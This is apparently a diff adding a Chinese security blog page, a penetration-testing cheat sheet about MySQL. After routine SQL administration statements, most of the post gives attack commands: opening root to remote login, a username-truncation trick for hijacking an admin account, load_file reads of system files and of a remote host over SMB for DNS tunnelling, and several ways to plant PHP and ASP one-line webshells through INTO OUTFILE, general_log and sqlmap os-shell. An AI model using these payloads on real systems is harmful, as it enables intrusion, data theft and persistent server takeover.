@@ -1,0 +1,1329 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|sans-serif:300,300italic,400,400italic,700,700italic|Lato:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Web安全,数据库,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="RcoIl的窝" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.png?v=5.1.0">
+
+
+
+
+
+
+<meta name="description" content="渗透测试中遇到一些MySQL问题">
+<meta name="keywords" content="Web安全,数据库">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL问题">
+<meta property="og:url" content="http://rcoil.me/2016/09/MySQL问题/index.html">
+<meta property="og:site_name" content="RcoIl的窝">
+<meta property="og:description" content="渗透测试中遇到一些MySQL问题">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://rcoil.me/image/MySQL问题/ntunnel_mysqli.PNG">
+<meta property="og:image" content="http://rcoil.me/image/MySQL问题/Navicat_HTTP渠道.PNG">
+<meta property="og:image" content="http://rcoil.me/image/MySQL问题/Navicat_test.PNG">
+<meta property="og:updated_time" content="2018-11-16T03:04:49.932Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MySQL问题">
+<meta name="twitter:description" content="渗透测试中遇到一些MySQL问题">
+<meta name="twitter:image" content="http://rcoil.me/image/MySQL问题/ntunnel_mysqli.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '6230266985318450000',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://rcoil.me/2016/09/MySQL问题/">
+
+
+
+
+
+  <title> MySQL问题 | RcoIl的窝 </title>
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ce3d1967864bac5f69f1c1a6042e5577";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">RcoIl的窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-count">
+          <a href="/count" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fa fa-free-code-camp"></i> <br>
+            
+            阅读榜
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://rcoil.me/2016/09/MySQL问题/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="RcoIl">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="RcoIl的窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                MySQL问题
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-09-26T12:28:58+08:00">
+                2016-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据库/" itemprop="url" rel="index">
+                    <span itemprop="name">数据库</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2016/09/MySQL问题/" class="leancloud_visitors" data-flag-title="MySQL问题">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                <!--
+				<i class="fa fa-eye"></i>
+				-->
+				<i class="fa fa-thermometer-three-quarters" aria-hidden="true"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>渗透测试中遇到一些MySQL问题<br><a id="more"></a></p>
+<h2 id="常用操作语句"><a href="#常用操作语句" class="headerlink" title="常用操作语句"></a>常用操作语句</h2><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><ol>
+<li><p>新建用户：</p>
+<blockquote>
+<p>CREATE USER name IDENTIFIED BY ‘ssapdrow’;</p>
+</blockquote>
+</li>
+<li><p>更改密码：</p>
+<blockquote>
+<p>SET PASSWORD FOR name=PASSWORD(‘fdddfd’);</p>
+</blockquote>
+</li>
+<li><p>权限管理</p>
+<blockquote>
+<p>SHOW GRANTS FOR name; //查看name用户权限<br>GRANT SELECT ON db_name. TO name;　　　　//给name用户db_name数据库的所有权限<br>REVOKE SELECT ON db_name. TO name;　　　　//GRANT的反操作，去除权限；</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><ol>
+<li><p>查看数据库：</p>
+<blockquote>
+<p>SHOW DATABASES;</p>
+</blockquote>
+</li>
+<li><p>创建数据库：</p>
+<blockquote>
+<p>CREATE DATABASE db_name;　　//db_name为数据库名</p>
+</blockquote>
+</li>
+<li><p>使用数据库：</p>
+<blockquote>
+<p>USE db_name;</p>
+</blockquote>
+</li>
+<li><p>删除数据库：</p>
+<blockquote>
+<p>DROP DATABASE db_name;</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><ul>
+<li>创建表：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name(</span><br><span class="line">id TINYINT UNSIGNED NOT NULL AUTO_INCREMENT,　　　　//id值，无符号、非空、递增——唯一性，可做主键。</span><br><span class="line">name VARCHAR(60) NOT NULL</span><br><span class="line">score TINYINT UNSIGNED NOT NULL DEFAULT 0,　　　　//设置默认列值</span><br><span class="line">PRIMARY KEY(id)</span><br><span class="line">)ENGINE=InnoDB　　　　//设置表的存储引擎，一般常用InnoDB和MyISAM；InnoDB可靠，支持事务；MyISAM高效不支持全文检索</span><br><span class="line">DEFAULT charset=utf8;　　//设置默认的编码，防止数据库中文乱码</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>如果有条件的创建数据表还可以使用 &gt;CREATE TABLE IF NOT EXISTS tb_name(……..</p>
+<ul>
+<li><p>复制表：</p>
+<blockquote>
+<p>CREATE TABLE tb_name2 SELECT * FROM tb_name;<br>或者部分复制：<br>CREATE TABLE tb_name2 SELECT id,name FROM tb_name;</p>
+</blockquote>
+</li>
+<li><p>创建临时表：</p>
+<blockquote>
+<p>CREATE TEMPORARY TABLE tb_name(这里和创建普通表一样);</p>
+</blockquote>
+</li>
+<li><p>查看数据库中可用的表：</p>
+<blockquote>
+<p>SHOW TABLES;</p>
+</blockquote>
+</li>
+<li><p>查看表的结构：</p>
+<blockquote>
+<p>DESCRIBE tb_name;<br>也可以使用：<br>SHOW COLUMNS in tb_name; 　　　　//from也可以</p>
+</blockquote>
+</li>
+<li><p>删除表：</p>
+<blockquote>
+<p>DROP [ TEMPORARY ] TABLE [ IF EXISTS ] tb_name[ ,tb_name2…….];<br>实例：<br>DROP TABLE IF EXISTS tb_name;</p>
+</blockquote>
+</li>
+<li><p>表重命名：</p>
+</li>
+</ul>
+<blockquote>
+<p>RENAME TABLE name_old TO name_new;<br>还可以使用：<br>ALTER TABLE name_old RENAME name_new;</p>
+</blockquote>
+<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><ul>
+<li><p>插入数据：</p>
+<blockquote>
+<p>INSERT INTO tb_name(id,name,score)VALUES(NULL,’张三’,140),(NULL,’张四’,178),(NULL,’张五’,134);<br>这里的插入多条数据直接在后边加上逗号，直接写入插入的数据即可；主键id是自增的列，可以不用写。</p>
+</blockquote>
+</li>
+<li><p>插入检索出来的数据：</p>
+<blockquote>
+<p>INSERT INTO tb_name(name,score) SELECT name,score FROM tb_name2;</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h3><ul>
+<li>指定更新数据：<blockquote>
+<p>UPDATE tb_name SET score=189 WHERE id=2;<br>UPDATE tablename SET columnName=NewValue [ WHERE condition ]</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="更新数据-1"><a href="#更新数据-1" class="headerlink" title="更新数据"></a>更新数据</h3><ul>
+<li>指定更新数据：<blockquote>
+<p>UPDATE tb_name SET score=189 WHERE id=2;<br>UPDATE tablename SET columnName=NewValue [ WHERE condition ]</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="MySQL外连"><a href="#MySQL外连" class="headerlink" title="MySQL外连"></a>MySQL外连</h2><ul>
+<li>改表</li>
+</ul>
+<p>vps上的MySQL不允许远程登陆，只能在<code>127.0.0.1</code>。<br>这个时候只要在vps上，登入MySQL后，更改 <code>MySQL</code>数据库里的 <code>user</code>表里的 <code>host</code> 项，从<code>localhost</code>改称<code>%</code> 或添加一个用户为<code>%</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt;update user set host = &apos;%&apos; where user = &apos;root&apos;;</span><br><span class="line">mysql&gt;select host, user from user;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>授权</li>
+</ul>
+<p>在MySQL服务器上MySQL命令行执行以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to root@&quot;%&quot; identified by &apos;rcoil&apos; with grant option;  </span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure></p>
+<p>其中上面两行代码的意思是给从任意ip地址连接的用户名为root，密码为abc的用户赋予所有的权限。其中的”%”为任意的ip地址，如果想设为特定的值也可以设定为特定的值。</p>
+<ul>
+<li>利用 Navicat 自带的http隧道链接</li>
+</ul>
+<p>我这里是本地做的测试。<br><img src="/image/MySQL问题/ntunnel_mysqli.PNG" alt="ntunnel_mysqli.PNG"><br><img src="/image/MySQL问题/Navicat_HTTP渠道.PNG" alt="Navicat_HTTP渠道.PNG"><br><img src="/image/MySQL问题/Navicat_test.PNG" alt="Navicat_test.PNG"></p>
+<p>就可以链接了。方便你我他。</p>
+<h2 id="MySQL数据截断问题"><a href="#MySQL数据截断问题" class="headerlink" title="MySQL数据截断问题"></a>MySQL数据截断问题</h2><p>之前在做ISCC的最后一道Web题上遇到的问题，但是一直忘了记录下来。</p>
+<p>对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。先判断注册时的username与数据库里已存在的username是否数据重复，如果出现重复，我们可以用数据的超长截断来绕过这些判断，从而导致更新密码的作用（一个username多个passwd）。</p>
+<p>原理：</p>
+<p>比如一个表的结构是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table admin(username varchar(10) not null,passwd varchar(10) not null);</span><br></pre></td></tr></table></figure></p>
+<p>可以看到username跟passwd的字节为10 但是这my.ini设置成<br><code>sql-mode=”NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”</code>的话<br>就算超出也会添加成功</p>
+<p>mysql的 sql_mode设置为default的时候，即没有开启<code>STRICT_ALL_TABLES</code>选项时，MySQL对于插入超长的值只会提示 warning，而不是error，这样可能会导致一些截断问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into RcoIl(`username`,`passwd`) values(&quot;admin                                          x&quot;, &quot;111&quot;)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from RcoIl;</span><br><span class="line">+----+-----------------+--------------+</span><br><span class="line">| id | username        | passwd       |</span><br><span class="line">+----+-----------------+--------------+</span><br><span class="line">| 1  | admin           | 11           |</span><br><span class="line">| 2  | admin           | 111          |</span><br><span class="line">+----+-----------------+--------------+</span><br></pre></td></tr></table></figure>
+<p>出现了两个admin的记录。</p>
+<p>从而我们可以用另外的密码去登录admin账户</p>
+<h2 id="MySQL的读写"><a href="#MySQL的读写" class="headerlink" title="MySQL的读写"></a>MySQL的读写</h2><ul>
+<li>读文件</li>
+</ul>
+<p>常见的读文件，可以用16进制代替字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">selectload_file(&apos;c:/boot.ini&apos;)</span><br><span class="line">selectload_file(0x633a2f626f6f742e696e69)</span><br><span class="line">selectload_file(&apos;//ecma.io/1.txt&apos;)      # smb协议</span><br><span class="line">selectload_file(&apos;\\\\ecma.io\\1.txt&apos;)    # 可用于DNS隧道</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>写文件<br>已知唯一的写文件的方式</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x313233 intooutfile &apos;D:/1.txt&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="root权限写shell方法"><a href="#root权限写shell方法" class="headerlink" title="root权限写shell方法"></a>root权限写shell方法</h2><ul>
+<li><p>union</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2) union select 1,2,3,4,5,6,7,&apos;&lt;? phpinfo(); ?&gt;’ into outfile ‘/home/wwwroot/lu4n.com/luan_phpinfo.php’#</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>no union</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2) into outfile ‘/home/wwwroot/demo/phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’#</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="无outfile权限时写shell方法"><a href="#无outfile权限时写shell方法" class="headerlink" title="无outfile权限时写shell方法"></a>无outfile权限时写shell方法</h2><p>outfile被禁止，或者写入文件被拦截，root权限，在数据库中操作如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%general%&apos;;         // 查看mysql日志路径</span><br><span class="line">set global general_log=on;                  //开启日志</span><br><span class="line">set global general_log_file=&apos;xxx路径/1.php&apos;;     //设置目录日志为shell地址</span><br><span class="line">select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;           //随意执行一条mysql语句让其写入一句话到1.php文件里</span><br></pre></td></tr></table></figure></p>
+<h2 id="os-shell查找绝对路径及写入"><a href="#os-shell查找绝对路径及写入" class="headerlink" title="os-shell查找绝对路径及写入"></a>os-shell查找绝对路径及写入</h2><p>前端随便查看某图片名字或者上传查看路径<br>linux系统：</p>
+<blockquote>
+<p>使用pwd查看当前路径<br>逐层使用ls查找（如uploads）路径<br>写入一句话<br><code>os-shell&gt;echo \&lt;\php\ \@eval\(\$\_POST\[rcoil\]\)\;\?\&gt; &gt;/uploads/rcoil.php</code></p>
+</blockquote>
+<p>tips：当无法执行命令或者权限低时，可以使用<code>/sbin/</code><br>如：<code>##/sbin/ifconfig</code></p>
+<p>windows系统：</p>
+<blockquote>
+<p>在前端找到一张图片，查看图片名：<code>rcoil.jpg</code><br>使用<code>dir /s /b d:\rcoil.jpg</code>,就能查找rcoil.jpg的路径<br>写入一句话<br><code>os-shell&gt;echo ^&lt;%eval request(chr(123))%^&gt; &gt;&gt;d:\web\1.txt</code></p>
+</blockquote>
+<p>当路径为中文名，没找到好方法。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>！坚持技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://ooo.0o0.ooo/2017/04/12/58ee21687d335.png" alt="RcoIl WeChat Pay">
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      RcoIl
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://rcoil.me/2016/09/MySQL问题/" title="MySQL问题">http://rcoil.me/2016/09/MySQL问题/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> Web安全</a>
+          
+            <a href="/tags/数据库/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> 数据库</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/03/利用目标系统现有工具快速打包目标机器数据/" rel="prev" title="利用目标系统现有工具快速打包目标机器数据">
+                利用目标系统现有工具快速打包目标机器数据 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODE5NS80NzY4"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="RcoIl">
+          <p class="site-author-name" itemprop="name">RcoIl</p>
+           
+              <p class="site-description motion-element" itemprop="description">好吃懒做，还有就是皮肤比黄皮果还黄！</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/RcoIl" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=rcoil@qq.com" target="_blank" title="Email">
+                  
+                    <i class="fa fa-fw fa-fa fa-envelope-open"></i>
+                  
+                  Email
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://isron.cn/" title="Isron" target="_blank">Isron</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://hacktech.cn/" title="Akkuman" target="_blank">Akkuman</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.163.com/passw0a_d/" title="rootrain" target="_blank">rootrain</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://kerlinglovsec.lofter.com/" title="kerling" target="_blank">kerling</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.luolikong.vip/" title="Fire-ant" target="_blank">Fire-ant</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://xnianq.cn/" title="xniang" target="_blank">xniang</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://thief.one/" title="nMask" target="_blank">nMask</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://cate4cafe.com/" title="cate4cafe" target="_blank">cate4cafe</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.ansbase5.org/" title="心的开始" target="_blank">心的开始</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://klionsec.github.io/" title="klion" target="_blank">klion</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#常用操作语句"><span class="nav-number">1.</span> <span class="nav-text">常用操作语句</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#用户管理"><span class="nav-number">1.1.</span> <span class="nav-text">用户管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据库操作"><span class="nav-number">1.2.</span> <span class="nav-text">数据库操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建表"><span class="nav-number">1.3.</span> <span class="nav-text">创建表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#插入数据"><span class="nav-number">1.4.</span> <span class="nav-text">插入数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#更新数据"><span class="nav-number">1.5.</span> <span class="nav-text">更新数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#更新数据-1"><span class="nav-number">1.6.</span> <span class="nav-text">更新数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL外连"><span class="nav-number">2.</span> <span class="nav-text">MySQL外连</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL数据截断问题"><span class="nav-number">3.</span> <span class="nav-text">MySQL数据截断问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL的读写"><span class="nav-number">4.</span> <span class="nav-text">MySQL的读写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root权限写shell方法"><span class="nav-number">5.</span> <span class="nav-text">root权限写shell方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无outfile权限时写shell方法"><span class="nav-number">6.</span> <span class="nav-text">无outfile权限时写shell方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#os-shell查找绝对路径及写入"><span class="nav-number">7.</span> <span class="nav-text">os-shell查找绝对路径及写入</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
